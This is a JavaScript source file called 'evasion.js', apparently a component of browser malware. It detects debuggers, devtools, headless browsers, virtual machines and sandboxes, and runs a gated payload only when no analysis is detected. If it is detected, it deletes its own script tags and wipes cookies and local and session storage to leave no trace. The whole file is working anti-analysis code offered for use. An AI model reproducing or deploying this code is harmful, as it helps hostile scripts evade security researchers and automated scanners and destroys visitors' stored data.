/**
 * evasion.js - Zero-Day Evasion Library
 * Detects analysis environments and triggers self-destruct if compromised.
 */

const Evasion = (() => {
    const checks = [];
    let isCompromised = false;

    // --- Detection Checks ---

    // 1. DevTools Detection (timing-based)
    checks.push(() => {
        const start = performance.now();
        debugger;
        const duration = performance.now() - start;
        return duration > 100; // Debugger paused = compromised
    });

    // 2. Window Size Anomaly (DevTools open often changes outer dimensions)
    checks.push(() => {
        const threshold = 160;
        const widthDiff = window.outerWidth - window.innerWidth;
        const heightDiff = window.outerHeight - window.innerHeight;
        return widthDiff > threshold || heightDiff > threshold;
    });

    // 3. Headless Browser Detection (Puppeteer, Playwright, Selenium)
    checks.push(() => {
        return !!(
            navigator.webdriver ||
            window._phantom ||
            window.__nightmare ||
            window.callPhantom ||
            window.Buffer ||
            (window.chrome && !window.chrome.runtime)
        );
    });

    // 4. VM/Sandbox Detection (low hardware specs)
    checks.push(() => {
        const cores = navigator.hardwareConcurrency;
        const mem = navigator.deviceMemory;
        const colorDepth = screen.colorDepth;
        // Sandboxes often have 1-2 cores, <4GB RAM, low color depth
        return cores <= 2 || mem < 4 || colorDepth < 24;
    });

    // 5. WebGL Renderer Fingerprinting (VMs often report "SwiftShader" or "llvmpipe")
    checks.push(() => {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            const vmIndicators = ['swiftshader', 'llvmpipe', 'virtualbox', 'vmware'];
            return vmIndicators.some(v => renderer.toLowerCase().includes(v));
        } catch (e) {
            return false;
        }
    });

    // 6. Permissions API Check (bots often lack permissions state)
    checks.push(async () => {
        try {
            const result = await navigator.permissions.query({ name: 'notifications' });
            return result.state === 'prompt' && !Notification; // Suspicious combo
        } catch (e) {
            return true; // Error often means restricted env
        }
    });

    // --- Core Functions ---

    async function runAllChecks() {
        for (const check of checks) {
            try {
                const result = await check();
                if (result) {
                    isCompromised = true;
                    return true;
                }
            } catch (e) {
                // Swallow errors silently
            }
        }
        return false;
    }

    function selfDestruct() {
        // Overwrite sensitive globals
        window.Evasion = undefined;
        window.Camouflage = undefined;

        // Remove current script to leave no trace in DOM
        if (document.currentScript) {
            document.currentScript.remove();
        } else {
            // Fallback: clear all script tags if we can't identify ourselves
            document.querySelectorAll('script').forEach(s => s.remove());
        }

        // Clear cookies and storage
        document.cookie.split(';').forEach(c => {
            document.cookie = c.trim().split('=')[0] + '=;expires=Thu, 01 Jan 1970 00:00:00 GMT';
        });
        try { localStorage.clear(); sessionStorage.clear(); } catch (e) { }

        // Optional: Redirect to benign page if high risk
        // window.location.href = 'about:blank';
    }

    return {
        check: runAllChecks,
        isCompromised: () => isCompromised,
        destruct: selfDestruct,
        // Gate function: only runs callback if environment is safe
        gate: async (callback) => {
            if (await runAllChecks()) {
                selfDestruct();
                return false;
            }
            return callback();
        }
    };
})();

// Export for module systems if available
if (typeof module !== 'undefined' && module.exports) {
    module.exports = Evasion;
}
